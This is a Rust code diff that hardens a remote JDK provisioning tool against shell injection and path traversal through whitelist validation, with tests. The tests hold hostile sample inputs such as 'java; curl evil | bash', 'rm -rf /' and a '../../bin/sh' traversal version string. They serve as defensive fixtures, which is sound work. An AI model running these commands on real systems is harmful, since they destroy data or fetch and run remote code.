@@ -49,6 +49,17 @@ pub fn parse_probe_output(stdout: &str, stderr: &str) -> Result<JvmProbe, String
             "parse_failed: empty openjdk version. stdout: {stdout:?} stderr: {stderr:?}"
         ));
     }
+    // 版本串会被拼进远端 shell 命令与路径，只允许 [A-Za-z0-9 . + _ -]，
+    // 拒绝 `/`、空格、引号、`$;|&` 等注入/穿越载体
+    if !openjdk_version
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '_' | '-'))
+    {
+        return Err(format!(
+            "parse_failed: suspicious openjdk version {openjdk_version:?} \
+             (allowed charset: [A-Za-z0-9 . + _ -]). stdout: {stdout:?} stderr: {stderr:?}"
+        ));
+    }
 
     let bisheng_version = combined
         .lines()
@@ -151,6 +162,25 @@ fn url_encode_path_segment(s: &str) -> String {
 pub const REMOTE_TOOLS_DIR: &str = "/tmp/friday-tools";
 pub const JDK_BINS: [&str; 4] = ["jcmd", "jstat", "jstack", "jmap"];
 
+/// 进度事件携带的工具名：必须与 MCP 工具名一致（前端按 tool.name 匹配工具卡片）
+pub const JDK_TOOL_NAME: &str = "ensure_tool";
+
+/// java_bin 字符集白名单校验（防 shell 注入）：
+/// 非空，且所有字符都在 [A-Za-z0-9 / . _ - + ~] 内
+pub fn validate_java_bin(java_bin: &str) -> Result<(), String> {
+    if java_bin.is_empty() {
+        return Err("invalid_params: java_bin must not be empty".to_string());
+    }
+    if !java_bin.chars().all(|c| {
+        c.is_ascii_alphanumeric() || matches!(c, ' ' | '/' | '.' | '_' | '-' | '+' | '~')
+    }) {
+        return Err(format!(
+            "invalid_params: java_bin contains disallowed characters (allowed: [A-Za-z0-9 / . _ - + ~]): {java_bin:?}"
+        ));
+    }
+    Ok(())
+}
+
 /// 按探测到的 OpenJDK 版本命名的安装目录
 pub fn jdk_home_for(openjdk_version: &str) -> String {
     format!("{REMOTE_TOOLS_DIR}/jdk-{openjdk_version}")
@@ -165,7 +195,8 @@ impl ToolPackage for JdkPackage {
     }
 
     async fn probe(&self, ctx: &ProvisionContext, java_bin: &str) -> Result<JvmProbe, ProvisionError> {
-        emit_progress(ctx, "jdk", "probe", &format!("running `{java_bin} -version`"));
+        validate_java_bin(java_bin).map_err(|e| ProvisionError::new("invalid_params", "probe", e))?;
+        emit_progress(ctx, JDK_TOOL_NAME, "probe", &format!("running `{java_bin} -version`"));
         let cmd = format!("{java_bin} -version 2>&1 ; echo '---' ; uname -m");
         let out = run_remote(ctx, &cmd, Duration::from_secs(ctx.timeouts.probe), "probe").await?;
         let probe = parse_probe_output(&out.stdout, &out.stderr).map_err(|e| {
@@ -182,8 +213,8 @@ impl ToolPackage for JdkPackage {
         let tarball = format!("{REMOTE_TOOLS_DIR}/jdk-{}.tar.gz", probe.openjdk_version);
 
         // 1. 远端缓存检查
-        emit_progress(ctx, "jdk", "check_cache", &format!("checking {home}/bin/jcmd"));
-        let check = run_remote(ctx, &format!("test -x {home}/bin/jcmd"), Duration::from_secs(ctx.timeouts.probe), "check_cache").await?;
+        emit_progress(ctx, JDK_TOOL_NAME, "check_cache", &format!("checking {home}/bin/jcmd"));
+        let check = run_remote(ctx, &format!("mkdir -p {REMOTE_TOOLS_DIR} && test -x {home}/bin/jcmd"), Duration::from_secs(ctx.timeouts.probe), "check_cache").await?;
         if check.exit_code == 0 {
             return Ok(ProvisionResult {
                 cached: true,
@@ -202,22 +233,26 @@ impl ToolPackage for JdkPackage {
             .map_err(|e| ProvisionError::new("parse_failed", "resolve_url", e))?;
 
         // 3. 通道 A：目标自拉
-        emit_progress(ctx, "jdk", "download", "channel A: remote curl/wget");
+        emit_progress(ctx, JDK_TOOL_NAME, "download", "channel A: remote curl/wget");
         let dl_result = try_remote_download(ctx, &url, &tarball).await;
         if let Err(a_err) = dl_result {
             tracing::warn!(session_id = %ctx.session_id, env_id = %ctx.env_id, error = %a_err, "channel A failed, falling back to channel B");
-            emit_progress(ctx, "jdk", "download", "channel B: local download + sftp upload");
+            emit_progress(ctx, JDK_TOOL_NAME, "download", "channel B: local download + sftp upload");
             // 通道 B：本地下载 + 上传
             let local = crate::provision::transfer::download_to_cache(&url, &ctx.cache_dir)
                 .map_err(|e| ProvisionError {
                     url: Some(url.clone()),
                     ..ProvisionError::new("provision_failed", "download_local", e)
                 })?;
-            crate::provision::transfer::validate_download(&local, 50 * 1024 * 1024)
-                .map_err(|e| ProvisionError {
+            if let Err(e) = crate::provision::transfer::validate_download(&local, 50 * 1024 * 1024) {
+                // 缓存的 tarball 损坏（如过小/被污染）：删除以便重试时重新下载
+                tracing::warn!(session_id = %ctx.session_id, env_id = %ctx.env_id, path = %local.display(), error = %e, "local cached tarball failed validation, removing");
+                let _ = std::fs::remove_file(&local);
+                return Err(ProvisionError {
                     url: Some(url.clone()),
                     ..ProvisionError::new("provision_failed", "download_local", e)
-                })?;
+                });
+            }
             ctx.channel.upload(&local, &tarball).await.map_err(|e| {
                 let ch = ctx.channel.clone();
                 let cleanup = tarball.clone();
@@ -232,13 +267,13 @@ impl ToolPackage for JdkPackage {
         }
 
         // 4. 解压 + 目录规范化 + 清理 tar 包
-        emit_progress(ctx, "jdk", "extract", &format!("extracting {tarball}"));
+        emit_progress(ctx, JDK_TOOL_NAME, "extract", &format!("extracting {tarball}"));
         let v = probe.openjdk_version.as_str();
         let extract_cmd = format!(
             "mkdir -p {REMOTE_TOOLS_DIR} && cd {REMOTE_TOOLS_DIR} && \
              tar -xzf jdk-{v}.tar.gz && \
              topdir=$(tar -tzf jdk-{v}.tar.gz | head -1 | cut -f1 -d'/') && \
-             if [ \"$topdir\" != \"jdk-{v}\" ] && [ -d \"$topdir\" ]; then mv \"$topdir\" jdk-{v}; fi && \
+             if [ \"$topdir\" != \"jdk-{v}\" ] && [ -d \"$topdir\" ]; then rm -rf jdk-{v} && mv \"$topdir\" jdk-{v}; fi && \
              rm -f jdk-{v}.tar.gz"
         );
         let extract = run_remote(ctx, &extract_cmd, Duration::from_secs(ctx.timeouts.extract), "extract").await?;
@@ -259,7 +294,7 @@ impl ToolPackage for JdkPackage {
         }
 
         // 5. 验证
-        emit_progress(ctx, "jdk", "verify", &format!("verifying {home}/bin/jcmd"));
+        emit_progress(ctx, JDK_TOOL_NAME, "verify", &format!("verifying {home}/bin/jcmd"));
         let verify = run_remote(
             ctx,
             &format!("test -x {home}/bin/jcmd && test -x {home}/bin/jstat"),
@@ -396,6 +431,30 @@ mod tests {
     }
 
     #[test]
+    fn test_parse_probe_output_rejects_hostile_version_injection() {
+        let stdout = "BiSheng_JDK_Enterprise_205.2.0.110.B001\n---\nx86_64\n";
+        let stderr = "openjdk version \"21.0.11; rm -rf ~ #\" 2025-04-15\n";
+        let err = parse_probe_output(stdout, stderr).unwrap_err();
+        assert!(err.contains("parse_failed"), "hostile version must be rejected, err: {err}");
+    }
+
+    #[test]
+    fn test_parse_probe_output_rejects_version_path_traversal() {
+        let stdout = "BiSheng_JDK_Enterprise_205.2.0.110.B001\n---\nx86_64\n";
+        let stderr = "openjdk version \"21.0.11/../../bin/sh\" 2025-04-15\n";
+        let err = parse_probe_output(stdout, stderr).unwrap_err();
+        assert!(err.contains("parse_failed"), "version with / must be rejected, err: {err}");
+    }
+
+    #[test]
+    fn test_parse_probe_output_accepts_build_suffix_version() {
+        let stdout = "BiSheng_JDK_Enterprise_205.2.0.110.B001\n---\nx86_64\n";
+        let stderr = "openjdk version \"21.0.11+9-LTS\" 2025-04-15\n";
+        let probe = parse_probe_output(stdout, stderr).unwrap();
+        assert_eq!(probe.openjdk_version, "21.0.11+9-LTS");
+    }
+
+    #[test]
     fn test_parse_bisheng_version_standard() {
         let v = parse_bisheng_version("BiSheng_JDK_Enterprise_205.2.0.110.B001").unwrap();
         assert_eq!(v.product_dir, "BiSheng JDK Enterprise");
@@ -442,6 +501,24 @@ mod tests {
         assert_eq!(normalize_arch("x86_64\n").unwrap(), "x64");
         assert_eq!(normalize_arch("aarch64\n").unwrap(), "aarch64");
         assert!(normalize_arch("riscv64").is_err());
+    }
+
+    #[test]
+    fn test_validate_java_bin_accepts_plain_and_paths() {
+        assert!(validate_java_bin("java").is_ok());
+        assert!(validate_java_bin("/usr/lib/jvm/bisheng-jdk/bin/java").is_ok());
+        assert!(validate_java_bin("./java21.bin").is_ok());
+        assert!(validate_java_bin("/opt/jdk-21.0.11+9/bin/java").is_ok());
+    }
+
+    #[test]
+    fn test_validate_java_bin_rejects_injection_and_empty() {
+        assert!(validate_java_bin("java; curl evil | bash").is_err());
+        assert!(validate_java_bin("java `x`").is_err());
+        assert!(validate_java_bin("java $(x)").is_err());
+        assert!(validate_java_bin("java \" $(id)\"").is_err());
+        assert!(validate_java_bin("java && rm -rf /").is_err());
+        assert!(validate_java_bin("").is_err());
     }
 
     use crate::exec::channel::{ExecChannel, ExecOutput};
@@ -516,6 +593,8 @@ mod tests {
         assert_eq!(result.arch, "x64");
         let calls = channel.calls.lock().await;
         assert!(calls.iter().all(|c| !c.contains("curl") && !c.contains("wget")), "calls: {calls:?}");
+        // C1: 下载通道写文件之前远端目录必须已存在（缓存检查命令顺带 mkdir）
+        assert!(calls.iter().any(|c| c.contains("mkdir -p /tmp/friday-tools")), "calls: {calls:?}");
     }
 
     #[tokio::test]
@@ -535,6 +614,8 @@ mod tests {
         let calls = channel.calls.lock().await;
         assert!(calls.iter().any(|c| c.contains("BiSheng%20JDK%20Enterprise")), "calls: {calls:?}");
         assert!(calls.iter().any(|c| c.contains("tar -xzf")), "calls: {calls:?}");
+        // I6: mv 分支必须先清掉可能残留的 jdk-{v} 目录，防止重试时 mv 嵌套进旧目录
+        assert!(calls.iter().any(|c| c.contains("rm -rf jdk-21.0.11")), "calls: {calls:?}");
     }
 
     #[tokio::test]
@@ -587,5 +668,55 @@ mod tests {
         let err = JdkPackage.ensure(&ctx, "java").await.unwrap_err();
         assert_eq!(err.code, "provision_failed");
         assert_eq!(err.stage, "download_local");
+    }
+
+    #[tokio::test]
+    async fn test_jdk_tool_name_matches_mcp_tool_def_name() {
+        let def = crate::tools::builtin::ensure_tool::ensure_tool_tool_def(
+            sqlx::SqlitePool::connect_lazy("sqlite::memory:").unwrap(),
+            Arc::new(TokioMutex::new(crate::exec::pool::ExecChannelPool::new())),
+            std::path::PathBuf::from("/tmp/x"),
+            crate::app::events::EventBus::disabled(),
+        );
+        assert_eq!(
+            JDK_TOOL_NAME,
+            def.name,
+            "progress tool name must equal the MCP tool name (frontend matches tool cards by it)"
+        );
+    }
+
+    #[tokio::test]
+    async fn test_probe_rejects_unsafe_java_bin_without_running() {
+        let channel = Arc::new(SequentialChannel::new(vec![]));
+        let ctx = test_ctx(channel.clone());
+        let err = JdkPackage.probe(&ctx, "java; rm -rf /").await.unwrap_err();
+        assert_eq!(err.code, "invalid_params");
+        assert_eq!(err.stage, "probe");
+        let calls = channel.calls.lock().await;
+        assert!(calls.is_empty(), "unsafe java_bin must never reach the remote shell, calls: {calls:?}");
+    }
+
+    #[tokio::test]
+    async fn test_ensure_channel_b_invalid_cached_tarball_removed() {
+        let channel = Arc::new(SequentialChannel::new(vec![
+            ("BiSheng_JDK_Enterprise_205.2.0.110.B001\nopenjdk version \"21.0.11\" 2025-04-15\n---\nx86_64\n", 0),
+            ("", 1),                // 远端缓存未命中
+            ("/usr/bin/curl\n", 0), // command -v curl
+            ("", 1),                // 通道 A 下载失败 → 落到通道 B
+        ]));
+        let tmp = tempfile::tempdir().unwrap();
+        let cache = tmp.path().join("cache");
+        std::fs::create_dir_all(&cache).unwrap();
+        // 预置一个损坏的小文件在缓存路径 → download_to_cache 命中 → validate 失败
+        let probe = parse_probe_output(PROBE_STDOUT, PROBE_STDERR).unwrap();
+        let url = build_download_url("https://artifactory.example.com/artifactory/release", &probe).unwrap();
+        let dest = crate::provision::transfer::cache_path_for(&cache, &url);
+        std::fs::write(&dest, b"<html>not a tarball</html>").unwrap();
+        let mut ctx = test_ctx(channel);
+        ctx.cache_dir = cache;
+        let err = JdkPackage.ensure(&ctx, "java").await.unwrap_err();
+        assert_eq!(err.code, "provision_failed");
+        assert_eq!(err.stage, "download_local");
+        assert!(!dest.exists(), "invalid cached tarball must be removed so retry can re-download");
     }
 }
